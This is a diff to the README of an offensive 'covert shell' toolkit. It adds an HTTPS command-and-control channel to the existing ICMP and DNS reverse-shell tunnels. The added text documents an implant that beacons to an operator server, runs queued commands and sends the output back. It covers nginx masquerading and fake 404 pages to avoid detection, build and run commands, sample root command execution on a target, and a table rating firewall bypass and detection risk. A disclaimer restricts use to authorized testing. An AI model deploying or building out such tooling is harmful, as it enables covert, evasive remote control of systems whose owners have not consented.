@@ -1,7 +1,7 @@
-# Covert Shell — ICMP & DNS
+# Covert Shell — ICMP, DNS & HTTPS
 
-Remote shell implementations that tunnel commands over ICMP echo packets
-and DNS TXT records.  Each protocol has a Python version and a C version.
+Remote shell implementations that tunnel commands over ICMP echo packets,
+DNS TXT records, and HTTPS.  Each protocol has a Python version and a C version.
 
 > **For authorized security research and CTF use only.**
 > Do not use against systems you don't own or have written permission to test.
@@ -12,10 +12,13 @@ and DNS TXT records.  Each protocol has a Python version and a C version.
 
 | File | Language | Protocol |
 |------|----------|----------|
-| `icmp_shell.py` | Python 3 | ICMP echo request/reply |
-| `icmp_shell.c`  | C (C99)  | ICMP echo request/reply |
-| `dns_shell.py`  | Python 3 | DNS TXT over UDP |
-| `dns_shell.c`   | C (C99)  | DNS TXT over UDP |
+| `icmp_shell.py`  | Python 3 | ICMP echo request/reply |
+| `icmp_shell.c`   | C (C99)  | ICMP echo request/reply |
+| `dns_shell.py`   | Python 3 | DNS TXT over UDP |
+| `dns_shell.c`    | C (C99)  | DNS TXT over UDP |
+| `https_shell.py` | Python 3 | HTTPS (TLS, beaconing C2) |
+| `https_shell.c`  | C (C99)  | HTTPS (TLS, beaconing C2) |
+| `test_https.sh`  | Bash     | Smoke test for https_shell.py |
 
 ---
 
@@ -40,6 +43,7 @@ client                        server
 
 Commands are base32-encoded and packed into DNS subdomain labels:
 
+
 ```
 <b32cmd>.<txid_hex>.cmd.shell.tunnel
 ```
@@ -55,14 +59,39 @@ client                                 server
   |<-- (DNS TXT response: base64(output)) ----------|
 ```
 
+### HTTPS
+
+The server is the operator console; the client (implant) runs on the target.
+The implant polls `GET /b` on a configurable interval, picks up a queued
+command, executes it, and POSTs base64-encoded output to `POST /r`.
+All traffic is TLS-encrypted.  The server masquerades as nginx and the
+endpoints look like ordinary JSON API calls.
+
+```
+implant                          operator (server)
+  |-- GET /b (beacon) ------------>|  {"id":0,"cmd":""}   ← nothing yet
+  |-- GET /b (beacon) ------------>|  {"id":1,"cmd":"bHMgLWxh"}
+  |   execute: ls -la              |
+  |-- POST /r {"id":1,"out":"..."} |  result printed to console
+```
+
+A self-signed TLS cert is auto-generated on first run (Python version).
+The C version requires a pre-generated cert (one openssl command).
+
 ---
 
 ## Build (C versions)
 
 ```bash
-gcc -O2 -Wall -o icmp_shell icmp_shell.c
-gcc -O2 -Wall -o dns_shell  dns_shell.c
+gcc -O2 -Wall -o icmp_shell  icmp_shell.c
+gcc -O2 -Wall -o dns_shell   dns_shell.c
+gcc -O2 -Wall -o https_shell https_shell.c \
+    $(pkg-config --cflags --libs openssl) -lpthread
 ```
+
+The HTTPS shell requires OpenSSL headers and libraries:
+- **macOS (Homebrew):** `brew install openssl`
+- **Debian/Ubuntu:** `apt install libssl-dev`
 
 ---
 
@@ -138,6 +167,64 @@ dns> exit
 
 ---
 
+### HTTPS shell
+
+The most firewall-friendly option.  Port 443 requires root on the server;
+use `--port 8443` for unprivileged testing.
+
+**Generate a cert (C version or bring-your-own):**
+```bash
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
+        -days 365 -nodes -subj '/CN=cdn.example.com'
+```
+The Python version auto-generates a cert if `--cert` / `--key` are omitted.
+
+**Server** (operator console):
+```bash
+sudo python3 https_shell.py server --port 443
+# or (C — cert required)
+sudo ./https_shell server --port 443 --cert cert.pem --key key.pem
+```
+
+Output:
+```
+[*] Generating self-signed cert…
+[*] Server IP  : 192.168.1.50
+[*] HTTPS C2   : https://192.168.1.50:443
+[*] Cert       : /tmp/https_shell_xyz/cert.pem
+[*] Beacon path: GET /b  POST /r
+[*] Waiting for implant…
+
+https>
+```
+
+**Client** (implant — no root needed):
+```bash
+python3 https_shell.py client 192.168.1.50
+# or
+./https_shell client 192.168.1.50
+```
+
+```
+[*] Implant beaconing → https://192.168.1.50:443  (every 3s)
+```
+
+Once the implant is beaconing, type commands in the operator console:
+```
+https> whoami
+root
+https> uname -a
+Linux target 5.15.0-91-generic ...
+https> exit
+```
+
+**Smoke test (Python server only):**
+```bash
+bash test_https.sh
+```
+
+---
+
 ## Docker (DNS shell server)
 
 Run the DNS server in a container and connect to it from a local terminal.
@@ -190,12 +277,14 @@ docker start dns-shell-server
 
 ## Limitations
 
-| | ICMP | DNS |
-|-|------|-----|
-| Privileges | Root (raw socket) on **both** sides | Root on server for port 53; client is unprivileged |
-| Max output per round-trip | ~76 KB (64 × 1200 B chunks) | ~2800 B raw (fits in one 4 KB DNS datagram) |
-| Max command length | ~3800 B | ~118 B (DNS label size limits) |
-| Firewall bypass | Works when ICMP is allowed (most LANs) | Works when outbound UDP 53/5353 is open |
+| | ICMP | DNS | HTTPS |
+|-|------|-----|-------|
+| Privileges | Root on **both** sides | Root for port 53; client unprivileged | Root for port 443; client unprivileged |
+| Max output per round-trip | ~76 KB (64 × 1200 B chunks) | ~2800 B raw | ~64 KB |
+| Max command length | ~3800 B | ~118 B (DNS label limits) | ~4 KB |
+| Firewall bypass | ICMP allowed on most LANs; blocked at most perimeters | UDP 53/5353 outbound | TCP 443 — nearly universal |
+| Detection risk | Large ICMP payloads flagged by IDS | High-entropy subdomains; abnormal query rate | Low — looks like normal HTTPS JSON API traffic |
+| Latency | Per-command (synchronous) | Per-command (synchronous) | Beacon interval (default 3 s) |
 
 ---
 
@@ -225,3 +314,19 @@ Offset  Size  Field
 - Data labels are lowercase base32, each at most 63 characters.
 - Response: a single DNS TXT RR containing base64(output), split into
   255-byte strings in the RDATA.
+
+### HTTPS protocol
+
+```
+GET /b  →  {"id": <int>, "cmd": "<base64 command>"}
+           {"id": 0,     "cmd": ""}              ← nothing pending
+
+POST /r ←  {"id": <int>, "out": "<base64 output>"}
+        →  {"ok": true}
+```
+
+- All other paths return a fake `404 Not Found` (nginx-style headers).
+- `id` is a monotonically increasing integer; the implant ignores
+  responses with an id it has already processed, making duplicate
+  delivery safe.
+- Output is capped at 64 KB per command.
